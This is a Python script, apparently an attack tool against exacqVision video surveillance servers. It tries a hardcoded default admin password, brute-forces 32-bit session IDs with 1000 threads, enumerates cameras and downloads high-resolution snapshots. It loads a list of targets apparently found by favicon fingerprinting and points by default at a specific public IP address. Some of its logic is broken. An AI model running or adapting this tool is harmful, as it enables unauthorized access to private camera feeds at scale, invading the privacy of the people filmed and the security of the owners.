from abc import abstractmethod
import errno
import threading
from queue import Queue
import time
import socket
import csv
import os
import ipaddress
from urllib import request
from urllib.parse import urlencode
from urllib.request import Request, urlopen
import json


q = Queue()

class ExacqVisionCam:
    def __init__(self, address):
        self.address = address
        self.config = []
        self.cameras = []
        self.logged_in = False
        self.session_id = ''     
        self.brute_force_queue = Queue()   

        self.brute_force_chunk_size = 0x00000100
        self.brute_force_thread_count = 1000


    def brute_force_threader(self):
        while True:
            session_range = self.brute_force_queue.get()
            # print how many chunks have been completed as a percentage
            #if (self.brute_force_queue.qsize() % self.brute_force_thread_count == 0):
            print(str((1 - float(self.brute_force_queue.qsize() / (0xffffffff / self.brute_force_chunk_size))) * 100) + '% complete')
            #print("Trying " + str(session_range) + "...")
            for session_id in session_range:
                if self.try_session(session_id):
                    self.brute_force_queue.clear()
                    return


    def try_session(self, session_id):
        #print("Trying " + str(session_id) + "...")
        url = self.address + '/server.web/devices?s=0x' + hex(session_id)[2:].zfill(8)
        try:
            request = Request(url)
            self.config = json.loads(urlopen(request).read().decode())
            self.logged_in = True
            self.session_id = session_id
            print("Found session ID 0x" + hex(session_id)[2:].zfill(8))
            return
        except:
            pass

    def default_login(self):
        url = self.address + '/login.web'
        post_fields = {
            'u': 'admin',
            'p': 'admin256',
            'l': 1,
            's': 0,
            'save': 1,
            'output': 'json',
            }
        try:
            request = Request(url, urlencode(post_fields).encode())
            self.session_id = urlopen(request).read().decode()
            self.logged_in = True
        except:
            return


    def brute_force_login(self):
        # try all hex values from 0x00000000 to 0xffffffff
        print("Starting threads...")
        for i in range(0, self.brute_force_thread_count):
            t = threading.Thread(target=self.brute_force_threader)
            t.daemon = True
            t.start()

        grouping = self.brute_force_chunk_size
        for session_start in range(0, int(0xffffffff / grouping) + 1):
            self.brute_force_queue.put(range(session_start * grouping, (session_start + 1) * grouping ))

        print("All threads quueued.")
        self.brute_force_queue.join()
        print("All threads completed.")

    def enum_cameras(self):
        if (not self.logged_in):
            return
        url = self.address + '/server.web/devices?s=' + self.session_id
        try:
            request = Request(url)
            self.config = json.loads(urlopen(request).read().decode())
        except:
            self.logged_in = False
            return

    def save_camera(self, camera):
        if (not self.logged_in):
            return
        url = self.address + '/video.web?s=' + self.session_id + ';camera=' + str(camera['cameraId']) + ';w=1920;h=1080;q=10'
        try:
            request = Request(url)
            image = urlopen(request)
            filename = os.path.join('output', self.address.split('://')[1] + '-' + camera['name'].replace('/', '-').replace('\\', '-') + '-' + str(camera['cameraId']) + '.jpg')
            with open(filename, "wb") as f:
                f.write(image.read())
        except:
            return

    def save_all_cameras(self):
        if (not self.logged_in):
            return
        for device in self.config['devices']:
            for camera in device['cameras']:
                self.save_camera(camera)

        

def dot2LongIP(ip):
    return int(ipaddress.IPv4Address(ip))

def long2DotIP(ipnum):
    return str(int(ipnum / 16777216) % 256) + "." + str(int(ipnum / 65536) % 256) + "." + str(int(ipnum / 256) % 256) + "." + str(ipnum % 256)


def threader(target):
    print("Pulling from ", target, "...")
    cam = ExacqVisionCam(target)
    cam.brute_force_login()
    cam.enum_cameras()
    cam.save_all_cameras()


def loadTargets():
    # open csv file as list
    print("Loading target file...")
    targets = []
    with open(os.path.join('db', 'exacqvision-favicon.txt')) as file:
        for line in file:
            targets.append(line.rstrip())
    print("Target file loaded.")
    return targets


if __name__ == '__main__':
    targets = loadTargets()
    threader('http://207.190.101.40:8080')
